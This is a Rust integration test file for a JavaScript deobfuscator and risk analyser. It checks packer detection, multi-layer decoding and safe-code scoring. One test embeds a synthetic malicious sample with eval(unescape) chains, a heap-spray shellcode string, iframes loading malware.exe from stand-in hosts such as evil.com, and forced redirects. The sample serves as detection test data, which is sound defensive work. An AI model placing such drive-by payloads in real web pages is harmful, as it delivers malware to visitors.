//! Integration test for JSUnpack deobfuscator

use browerai_deobfuscation::{JSUnpackDeobfuscator, PackerType, RiskLevel};

#[test]
fn test_jsunpack_dean_edwards_packer() {
    let packed = r#"eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0 1="2 3!";4.5(1);',6,6,'var|message|Hello|World|console|log'.split('|'),0,{}))"#;

    let mut deobf = JSUnpackDeobfuscator::new();
    let result = deobf.unpack(packed).unwrap();

    println!("=== Dean Edwards Packer Test ===");
    println!("Packer: {:?}", result.packer_detected);
    println!("Layers: {}", result.layers_unpacked);
    println!("Code:\n{}", result.code);

    assert_eq!(result.packer_detected, Some(PackerType::DeanEdwards));
    assert!(result.layers_unpacked > 0);
    assert!(result.code.contains("var"));
}

#[test]
fn test_jsunpack_multi_layer() {
    let code = r#"
        var encoded = atob("SGVsbG8gV29ybGQh");
        var charCodes = String.fromCharCode(72, 101, 108, 108, 111);
        var unescaped = unescape("%48%65%6C%6C%6F");
    "#;

    let mut deobf = JSUnpackDeobfuscator::new();
    let result = deobf.unpack(code).unwrap();

    println!("\n=== Multi-Layer Decoding Test ===");
    println!("Layers unpacked: {}", result.layers_unpacked);
    println!("Techniques: {:?}", result.techniques_found);
    println!("Decoded code:\n{}", result.code);

    assert!(result.layers_unpacked > 0);
    assert!(result.code.contains("Hello"));
}

#[test]
fn test_jsunpack_malicious_detection() {
    let malicious = r#"
        eval(unescape("%75%76%61%72"));
        eval(unescape("%75%76%61%72"));
        eval(unescape("%75%76%61%72"));
        eval(unescape("%75%76%61%72"));
        eval(unescape("%75%76%61%72"));
        eval(unescape("%75%76%61%72"));
        var shellcode = "%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090";
        document.write("<iframe src='http://evil.com/malware.exe'></iframe>");
        document.write("<iframe src='http://evil2.com/malware.exe'></iframe>");
        window.location = "http://evil3.com";
        window.location = "http://evil4.com";
        var xhr = new ActiveXObject("Microsoft.XMLHTTP");
    "#;

    let mut deobf = JSUnpackDeobfuscator::new();
    let analysis = deobf.analyze(malicious).unwrap();

    println!("\n=== Malicious Code Analysis ===");
    println!("Safety score: {:.2}/1.00", analysis.safety_score);
    println!("Risk level: {:?}", analysis.risk_level);
    println!("Shellcode detected: {}", analysis.shellcode_detected);
    println!("URLs found: {}", analysis.extracted_urls.len());
    
    println!("\nSuspicious patterns:");
    for pattern in &analysis.suspicious_patterns {
        println!("  [{:?}] {} - {}", 
            pattern.severity, 
            pattern.pattern_type, 
            pattern.description
        );
    }

    println!("\nRecommendations:");
    for rec in &analysis.recommendations {
        println!("  • {}", rec);
    }

    assert!(analysis.shellcode_detected);
    assert!(analysis.risk_level >= RiskLevel::High);
    assert!(analysis.safety_score < 0.5);
    assert!(analysis.suspicious_patterns.len() > 0);
    assert!(analysis.extracted_urls.len() > 0);
}

#[test]
fn test_jsunpack_safe_code() {
    let safe_code = r#"
        function greet(name) {
            console.log("Hello, " + name);
        }
        greet("World");
    "#;

    let mut deobf = JSUnpackDeobfuscator::new();
    let analysis = deobf.analyze(safe_code).unwrap();

    println!("\n=== Safe Code Analysis ===");
    println!("Safety score: {:.2}/1.00", analysis.safety_score);
    println!("Risk level: {:?}", analysis.risk_level);

    assert_eq!(analysis.risk_level, RiskLevel::Low);
    assert!(analysis.safety_score >= 0.9);
    assert!(analysis.suspicious_patterns.is_empty());
}
